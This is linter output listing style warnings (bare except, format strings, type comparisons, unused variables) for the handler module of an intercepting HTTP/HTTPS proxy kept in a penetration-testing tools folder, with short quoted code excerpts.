118 |             IP = s.getsockname()[0]
    |             ^^
119 |         except:
120 |             IP = "127.0.0.1"
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:119:9
    |
117 |             s.connect(("10.255.255.255", 1))
118 |             IP = s.getsockname()[0]
119 |         except:
    |         ^^^^^^
120 |             IP = "127.0.0.1"
121 |         finally:
    |

N806 Variable `IP` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:120:13
    |
118 |             IP = s.getsockname()[0]
119 |         except:
120 |             IP = "127.0.0.1"
    |             ^^
121 |         finally:
122 |             s.close()
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:128:13
    |
126 |     def log_message(self, format, *args):
127 |         if (self.options["verbose"] or self.options["debug"]) or (
128 |             type(self.options["log"]) == str and self.options["log"] != "none"
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
129 |         ):
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:131:19
    |
129 |           ):
130 |
131 |               txt = "%s - - [%s] %s\n" % (
    |  ___________________^
132 | |                 self.address_string(),
133 | |                 self.log_date_time_string(),
134 | |                 format % args,
135 | |             )
    | |_____________^
136 |
137 |               logger.out(txt, self.options["log"], "")
    |
help: Replace with format specifiers

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:177:9
    |
175 |                 if not readable(v):
176 |                     return False
177 |         except:
    |         ^^^^^^
178 |             return False
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:188:24
    |
187 |         if not os.path.isfile(certpath):
188 |             logger.dbg("Generating valid SSL certificate for ({})...".format(hostname))
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
189 |             epoch = "%d" % (time.time() * 1000)
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:189:21
    |
187 |         if not os.path.isfile(certpath):
188 |             logger.dbg("Generating valid SSL certificate for ({})...".format(hostname))
189 |             epoch = "%d" % (time.time() * 1000)
    |                     ^^^^
190 |
191 |             # Workaround for the Windows' RANDFILE bug
    |
help: Replace with format specifiers

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:192:20
    |
191 |             # Workaround for the Windows' RANDFILE bug
192 |             if not "RANDFILE" in os.environ.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
193 |                 os.environ["RANDFILE"] = os.path.normpath(
194 |                     "%s/.rnd" % (options["certdir"].rstrip("/"))
    |
help: Remove `.keys()`

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:192:20
    |
191 |             # Workaround for the Windows' RANDFILE bug
192 |             if not "RANDFILE" in os.environ.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
193 |                 os.environ["RANDFILE"] = os.path.normpath(
194 |                     "%s/.rnd" % (options["certdir"].rstrip("/"))
    |
help: Convert to `not in`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:194:21
    |
192 |             if not "RANDFILE" in os.environ.keys():
193 |                 os.environ["RANDFILE"] = os.path.normpath(
194 |                     "%s/.rnd" % (options["certdir"].rstrip("/"))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
195 |                 )
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:204:17
    |
202 |                 options["certkey"],
203 |                 "-subj",
204 |                 "/CN=%s" % hostname,
    |                 ^^^^^^^^^^^^^^^^^^^
205 |             ]
206 |             cmd2 = [
    |
help: Replace with format specifiers

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:227:41
    |
225 |                 (stdout, stderr) = p2.communicate()
226 |
227 |             except FileNotFoundError as e:
    |                                         ^
228 |                 logger.err(
229 |                     "Can't serve HTTPS traffic because there is no 'openssl' tool installed on the system!"
    |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:240:21
    |
238 |               if stdout or stderr:
239 |                   logger.err(
240 | /                     "Openssl x509 crt request failed:\n{}".format(
241 | |                         (stdout + stderr).decode()
242 | |                     )
    | |_____________________^
243 |                   )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:246:17
    |
245 |             logger.fatal(
246 |                 'Could not create interception Certificate: "{}"'.format(certpath)
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
247 |             )
248 |             return ""
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:256:20
    |
254 |         certpath = ""
255 |
256 |         logger.dbg('CONNECT intercepted: "%s"' % self.request.uri)
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
257 |
258 |         certpath = ProxyRequestHandler.generate_ssl_certificate(hostname)
    |
help: Replace with format specifiers

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:273:9
    |
271 |                 )
272 |             )
273 |         except:
    |         ^^^^^^
274 |             logger.err('Connection reset by peer: "{}"'.format(self.request.uri))
275 |             self._send_error(502)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:274:24
    |
272 |             )
273 |         except:
274 |             logger.err('Connection reset by peer: "{}"'.format(self.request.uri))
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
275 |             self._send_error(502)
276 |             return
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:289:20
    |
287 |         address[1] = int(address[1]) or 443
288 |
289 |         logger.dbg('CONNECT relaying: "%s"' % self.request.uri)
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
290 |
291 |         try:
    |
help: Replace with format specifiers

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:294:24
    |
292 |             s = socket.create_connection(address, timeout=self.options["timeout"])
293 |         except Exception as e:
294 |             logger.err("Could not relay connection: ({})".format(str(e)))
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
295 |             self._send_error(502)
296 |             return
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:319:13
    |
317 |       def reverse_proxy_loop_detected(self, command, fetchurl, req_body):
318 |           logger.err(
319 | /             "[Reverse-proxy loop detected from peer {}] {} {}".format(
320 | |                 self.client_address[0], command, fetchurl
321 | |             )
    | |_____________^
322 |           )
    |
help: Convert to f-string

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:339:9
    |
337 |           timestamp = datetime.utcnow()
338 |
339 | /         if (
340 | |             hasattr(self, "request")
341 | |             and hasattr(self.request, "uri")
342 | |             and type(self.request.uri) == str
343 | |         ):
344 | |             if self.request.uri.startswith("//"):
    | |_________________________________________________^
345 |                   self.request.uri = self.request.uri[1:]
    |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:342:17
    |
340 |             hasattr(self, "request")
341 |             and hasattr(self.request, "uri")
342 |             and type(self.request.uri) == str
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
343 |         ):
344 |             if self.request.uri.startswith("//"):
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:351:13
    |
349 |         remote_host = self.request.client_address
350 |         if (
351 |             type(self.request.client_address) == list
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
352 |             or type(self.request.client_address) == tuple
353 |         ) and len(self.request.client_address) > 0:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:352:16
    |
350 |         if (
351 |             type(self.request.client_address) == list
352 |             or type(self.request.client_address) == tuple
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
353 |         ) and len(self.request.client_address) > 0:
354 |             remote_host = self.request.client_address[0]
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:366:17
    |
364 |                     if ":" in auth_decoded:
365 |                         http_basic_auth = auth_decoded.split(":")[0]
366 |                 except:
    |                 ^^^^^^
367 |                     pass
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:387:13
    |
386 |         if (
387 |             "access_log" in self.options.keys()
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
388 |             and self.options["access_log"] != None
389 |             and len(self.options["access_log"]) > 0
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:388:47
    |
386 |         if (
387 |             "access_log" in self.options.keys()
388 |             and self.options["access_log"] != None
    |                                               ^^^^
389 |             and len(self.options["access_log"]) > 0
390 |         ):
    |
help: Replace with `cond is not None`

F841 Local variable `output` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:431:9
    |
429 |             self.request.uri = newpath
430 |
431 |         output = handler()
    |         ^^^^^^
432 |
433 |         self.request.method = self.request.method
    |
help: Remove assignment to unused variable `output`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:444:13
    |
442 |             try:
443 |                 self.response_reason = requests.status_codes._codes[code][0]
444 |             except:
    |             ^^^^^^
445 |                 pass
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:457:13
    |
455 |             try:
456 |                 self.response_reason = requests.status_codes._codes[code][0]
457 |             except:
    |             ^^^^^^
458 |                 pass
    |

F841 Local variable `content_length` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:478:9
    |
476 |         self.request.is_ssl = self.is_ssl
477 |
478 |         content_length = int(self.request.headers.get("Content-Length", 0))
    |         ^^^^^^^^^^^^^^
479 |         if not self.options["allow_invalid"]:
480 |             if not ProxyRequestHandler.isValidRequest(self.request, self.request.body):
    |
help: Remove assignment to unused variable `content_length`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:479:9
    |
478 |           content_length = int(self.request.headers.get("Content-Length", 0))
479 | /         if not self.options["allow_invalid"]:
480 | |             if not ProxyRequestHandler.isValidRequest(self.request, self.request.body):
    | |_______________________________________________________________________________________^
481 |                   self.logger.dbg(
482 |                       "[DROP] Invalid HTTP request from: {}".format(
    |
help: Combine `if` statements using `and`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:482:21
    |
480 |               if not ProxyRequestHandler.isValidRequest(self.request, self.request.body):
481 |                   self.logger.dbg(
482 | /                     "[DROP] Invalid HTTP request from: {}".format(
483 | |                         self.client_address[0]
484 | |                     )
    | |_____________________^
485 |                   )
486 |                   return
    |
help: Convert to f-string

N806 Variable `originChanged` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:497:9
    |
495 |         origuri = self.request.uri
496 |         newuri = self.request.uri
497 |         originChanged = False
    |         ^^^^^^^^^^^^^
498 |         ignore_response_decompression_errors = False
499 |         if "Host" not in self.request.headers.keys():
    |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:499:12
    |
497 |         originChanged = False
498 |         ignore_response_decompression_errors = False
499 |         if "Host" not in self.request.headers.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
500 |             self.request.headers["Host"] = self.request.host
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:503:13
    |
502 |         logger.info(
503 |             "[REQUEST] {} {}".format(self.request.method, self.request.uri),
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
504 |             color=ProxyLogger.colors_map["green"],
505 |         )
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:514:28
    |
512 |             newuri = self.request.uri
513 |
514 |             if modified != None and type(modified) == bool:
    |                            ^^^^
515 |                 modified |= origuri != newuri
    |
help: Replace with `cond is not None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:514:37
    |
512 |             newuri = self.request.uri
513 |
514 |             if modified != None and type(modified) == bool:
    |                                     ^^^^^^^^^^^^^^^^^^^^^^
515 |                 modified |= origuri != newuri
    |

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:524:41
    |
522 |             elif modified and req_body_modified is not None:
523 |                 self.request.body = req_body_modified
524 |                 if self.request.body != None:
    |                                         ^^^^
525 |                     reqhdrs = [x.lower() for x in self.request.headers.keys()]
526 |                     if "content-length" in reqhdrs:
    |
help: Replace with `cond is not None`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:525:46
    |
523 |                 self.request.body = req_body_modified
524 |                 if self.request.body != None:
525 |                     reqhdrs = [x.lower() for x in self.request.headers.keys()]
    |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
526 |                     if "content-length" in reqhdrs:
527 |                         del self.request.headers["Content-Length"]
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:533:38
    |
531 |             if (
532 |                 parsed.netloc != inbound_origin
533 |                 and parsed.netloc != None
    |                                      ^^^^
534 |                 and len(parsed.netloc) > 1
535 |             ):
    |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:537:21
    |
535 |               ):
536 |                   logger.info(
537 | /                     "Plugin redirected request from [{}] to [{}]".format(
538 | |                         inbound_origin, parsed.netloc
539 | |                     )
    | |_____________________^
540 |                   )
541 |                   outbound_origin = parsed.netloc
    |
help: Convert to f-string

N806 Variable `originChanged` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:542:17
    |
540 |                 )
541 |                 outbound_origin = parsed.netloc
542 |                 originChanged = True
    |                 ^^^^^^^^^^^^^
543 |                 # newuri = (parsed.path + '?' + parsed.query if parsed.query else parsed.path)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:547:28
    |
545 |         except Exception as e:
546 |             if "DropConnectionException" in str(e):
547 |                 logger.err("Plugin demanded to drop the request: ({})".format(str(e)))
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
548 |                 self.request.connection.no_keep_alive = True
549 |                 return
    |
help: Convert to f-string

UP004 [*] Class `Response` inherits from `object`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:556:32
    |
554 |                 res_body_plain = "DontFetchResponseException"
555 |
556 |                 class Response(object):
    |                                ^^^^^^
557 |                     pass
    |
help: Remove `object` inheritance

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:562:28
    |
561 |             else:
562 |                 logger.err("Exception catched in request_handler: {}".format(str(e)))
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
563 |                 if options["debug"]:
564 |                     raise
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:571:33
    |
569 |         if newuri[0] == "/":
570 |             if self.is_ssl:
571 |                 req_path_full = "https://%s%s" % (self.request.headers["Host"], newuri)
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
572 |             else:
573 |                 req_path_full = "http://%s%s" % (self.request.headers["Host"], newuri)
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:573:33
    |
571 |                 req_path_full = "https://%s%s" % (self.request.headers["Host"], newuri)
572 |             else:
573 |                 req_path_full = "http://%s%s" % (self.request.headers["Host"], newuri)
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
574 |
575 |         elif newuri.startswith("http://") or newuri.startswith("https://"):
    |
help: Replace with format specifiers

SIM108 Use ternary operator `newpath = parsed.path if len(parsed.path) > 0 else "/"` instead of `if`-`else`-block
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:580:13
    |
578 |               parsed = urlparse(req_path_full)
579 |               newpath = ""
580 | /             if len(parsed.path) > 0:
581 | |                 newpath = parsed.path
582 | |             else:
583 | |                 newpath = "/"
    | |_____________________________^
584 |
585 |               if len(parsed.query) > 0:
    |
help: Replace `if`-`else`-block with `newpath = parsed.path if len(parsed.path) > 0 else "/"`

F841 Local variable `path` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:597:25
    |
596 |         u = urlparse(req_path_full)
597 |         scheme, netloc, path = (
    |                         ^^^^
598 |             u.scheme,
599 |             u.netloc,
    |
help: Remove assignment to unused variable `path`

F841 Local variable `origin` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:606:9
    |
604 |             netloc = inbound_origin
605 |
606 |         origin = (scheme, inbound_origin)
    |         ^^^^^^
607 |         neworigin = (scheme, netloc)
    |
help: Remove assignment to unused variable `origin`

F841 Local variable `neworigin` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:607:9
    |
606 |         origin = (scheme, inbound_origin)
607 |         neworigin = (scheme, netloc)
    |         ^^^^^^^^^
608 |
609 |         if not dont_fetch_response:
    |
help: Remove assignment to unused variable `neworigin`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:620:17
    |
618 |                     ip = socket.gethostbyname(outbound_origin)
619 |
620 |                 except:
    |                 ^^^^^^
621 |                     ip = urlparse(fetchurl).netloc
622 |                     if not ip:
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:629:21
    |
628 |                   if (
629 | /                     plugins.IProxyPlugin.proxy2_metadata_headers[
630 | |                         "ignore_response_decompression_errors"
631 | |                     ]
632 | |                     in self.request.headers.keys()
    | |__________________________________________________^
633 |                   ):
634 |                       ignore_response_decompression_errors = True
    |
help: Remove `.keys()`

F405 `plugins` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:629:21
    |
628 |                 if (
629 |                     plugins.IProxyPlugin.proxy2_metadata_headers[
    |                     ^^^^^^^
630 |                         "ignore_response_decompression_errors"
631 |                     ]
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:647:46
    |
645 |                     )
646 |
647 |                 reqhdrskeys = [x.lower() for x in self.request.headers.keys()]
    |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
648 |                 if (
649 |                     plugins.IProxyPlugin.proxy2_metadata_headers[
    |
help: Remove `.keys()`

F405 `plugins` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:649:21
    |
647 |                 reqhdrskeys = [x.lower() for x in self.request.headers.keys()]
648 |                 if (
649 |                     plugins.IProxyPlugin.proxy2_metadata_headers[
    |                     ^^^^^^^
650 |                         "override_host_header"
651 |                     ].lower()
    |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:654:24
    |
652 |                     in reqhdrskeys
653 |                 ):
654 |                     if "Host" not in self.request.headers.keys():
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
655 |                         self.request.headers["Host"] = self.request.host
656 |                         self.set_header("Host", self.request.host)
    |
help: Remove `.keys()`

F405 `plugins` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:660:25
    |
658 |                     o = self.request.headers["Host"]
659 |                     n = self.request.headers[
660 |                         plugins.IProxyPlugin.proxy2_metadata_headers[
    |                         ^^^^^^^
661 |                             "override_host_header"
662 |                         ]
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:667:27
    |
665 |                     fetchurl = fetchurl.replace(o, n)
666 |
667 |                     while "Host" in self.request.headers.keys():
    |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
668 |                         del self.request.headers["Host"]
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:674:41
    |
672 |                 # ProxyRequestHandler.filter_headers(self.request.headers)
673 |                 req_body = ""
674 |                 if self.request.body == None:
    |                                         ^^^^
675 |                     req_body = ""
676 |                 else:
    |
help: Replace with `cond is None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:678:28
    |
676 |                 else:
677 |                     try:
678 |                         if type(self.request.body) == bytes:
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
679 |                             req_body = self.request.body
680 |                         else:
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:692:21
    |
691 |                   if (
692 | /                     plugins.IProxyPlugin.proxy2_metadata_headers[
693 | |                         "domain_front_host_header"
694 | |                     ]
695 | |                     in new_req_headers.keys()
    | |_____________________________________________^
696 |                   ):
697 |                       if "Host" in new_req_headers.keys():
    |
help: Remove `.keys()`

F405 `plugins` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:692:21
    |
691 |                 if (
692 |                     plugins.IProxyPlugin.proxy2_metadata_headers[
    |                     ^^^^^^^
693 |                         "domain_front_host_header"
694 |                     ]
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:697:24
    |
695 |                     in new_req_headers.keys()
696 |                 ):
697 |                     if "Host" in new_req_headers.keys():
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
698 |                         del new_req_headers["Host"]
    |
help: Remove `.keys()`

F405 `plugins` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:704:25
    |
702 |                     )
703 |                     new_req_headers["Host"] = self.request.headers[
704 |                         plugins.IProxyPlugin.proxy2_metadata_headers[
    |                         ^^^^^^^
705 |                             "domain_front_host_header"
706 |                         ]
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:755:21
    |
754 |                   logger.dbg(
755 | /                     "Response from reverse-proxy fetch came at {} bytes.".format(
756 | |                         len(res_body)
757 | |                     )
    | |_____________________^
758 |                   )
    |
help: Convert to f-string

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:760:20
    |
758 |                 )
759 |
760 |                 if "Content-Length" not in res.headers.keys() and len(res_body) != 0:
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
761 |                     res.headers["Content-Length"] = str(len(res_body))
762 |                     self.response_length = len(res_body)
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:766:20
    |
764 |                 myreq.close()
765 |
766 |                 if type(res_body) == str:
    |                    ^^^^^^^^^^^^^^^^^^^^^
767 |                     res_body = str.encode(res_body)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:771:21
    |
769 |               except requests.exceptions.ConnectionError as e:
770 |                   logger.err(
771 | /                     "Exception occured while reverse-proxy fetching resource : URL({}).\nException: ({})".format(
772 | |                         fetchurl, str(e)
773 | |                     )
    | |_____________________^
774 |                   )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:784:28
    |
783 |             except Exception as e:
784 |                 logger.err("Could not proxy request: ({})".format(str(e)))
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
785 |                 if "RemoteDisconnected" in str(e) or "Read timed out" in str(e):
786 |                     return
    |
help: Convert to f-string

B010 [*] Do not call `setattr` with a constant attribute value. It is not any safer than normal property access.
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:795:13
    |
793 |                 return
794 |
795 |             setattr(res, "headers", res.msg)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
796 |             self.response_headers = res.msg
    |
help: Replace `setattr` with assignment

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:816:12
    |
814 |         self.request.uri = origuri
815 |
816 |         if type(modified) == bool:
    |            ^^^^^^^^^^^^^^^^^^^^^^
817 |             modified |= newuri != origuri
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:824:38
    |
822 |             res_body = self.encode_content_body(res_body_plain, content_encoding)
823 |
824 |             reshdrs = [x.lower() for x in res.headers.keys()]
    |                                      ^^^^^^^^^^^^^^^^^^^^^^^
825 |             if "content-length" in reshdrs:
826 |                 del res.headers["Content-Length"]
    |
help: Remove `.keys()`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:831:33
    |
829 |                 res.headers["Content-Length"] = str(len(res_body))
830 |                 self.response_length = len(res_body)
831 |             except Exception as e:
    |                                 ^
832 |                 logger.dbg(
833 |                     "Could not set proper Content-Length as running len on res_body failed"
    |
help: Remove assignment to unused variable `e`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:837:13
    |
836 |         if (
837 |             "Transfer-Encoding" in res.headers.keys()
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
838 |             and res.headers["Transfer-Encoding"] == "chunked"
839 |         ):
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:843:13
    |
842 |         if (not ignore_response_decompression_errors) and (
843 |             "Accept-Encoding" in self.request.headers.keys()
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
844 |         ):
845 |             encToUse = (
    |
help: Remove `.keys()`

N806 Variable `encToUse` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:845:13
    |
843 |             "Accept-Encoding" in self.request.headers.keys()
844 |         ):
845 |             encToUse = (
    |             ^^^^^^^^
846 |                 self.request.headers["Accept-Encoding"].split(" ")[0].replace(",", "")
847 |             )
    |

F405 `plugins` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:849:33
    |
847 |             )
848 |
849 |             override_resp_enc = plugins.IProxyPlugin.proxy2_metadata_headers[
    |                                 ^^^^^^^
850 |                 "override_response_content_encoding"
851 |             ]
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:853:16
    |
851 |             ]
852 |
853 |             if override_resp_enc in res.headers.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
854 |                 logger.dbg(
855 |                     "Plugin asked to override response content encoding without changing header's value."
    |
help: Remove `.keys()`

N806 Variable `encToUse` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:875:29
    |
873 |                     for enc in encs:
874 |                         if enc in ProxyRequestHandler.SUPPORTED_ENCODINGS:
875 |                             encToUse = encs[0]
    |                             ^^^^^^^^
876 |                             reencoded = True
877 |                             break
    |

